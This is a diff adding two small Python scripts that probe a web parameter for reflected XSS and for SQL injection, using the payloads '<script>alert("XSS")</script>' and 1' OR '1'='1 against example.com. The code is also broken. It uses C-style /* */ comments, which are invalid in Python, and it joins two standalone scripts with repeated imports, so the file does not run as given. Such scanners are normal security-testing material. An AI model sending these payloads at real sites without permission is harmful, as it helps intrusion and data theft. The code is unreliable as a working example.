@@ -1,0 +1,41 @@
+/*Basic XSS Test Script*/
+
+import requests
+from bs4 import BeautifulSoup
+
+def test_xss(url, param, payload):
+    params = {param: payload}
+    response = requests.get(url, params=params)
+    if payload in response.text:
+        return True
+    return False
+
+url = 'http://example.com/search'
+param = 'query'
+payload = '<script>alert("XSS")</script>'
+
+if test_xss(url, param, payload):
+    print(f'Vulnerable to XSS: {url}')
+else:
+    print(f'Not vulnerable to XSS: {url}')
+
+
+/*SQL Injection Test Script*/
+
+import requests
+
+def test_sqli(url, param, payload):
+    params = {param: payload}
+    response = requests.get(url, params=params)
+    if "SQL syntax" in response.text or "Warning" in response.text:
+        return True
+    return False
+
+url = 'http://example.com/vulnerable_page.php'
+param = 'id'
+payload = '1\' OR \'1\'=\'1'
+
+if test_sqli(url, param, payload):
+    print(f'Vulnerable to SQL Injection: {url}')
+else:
+    print(f'Not vulnerable to SQL Injection: {url}')
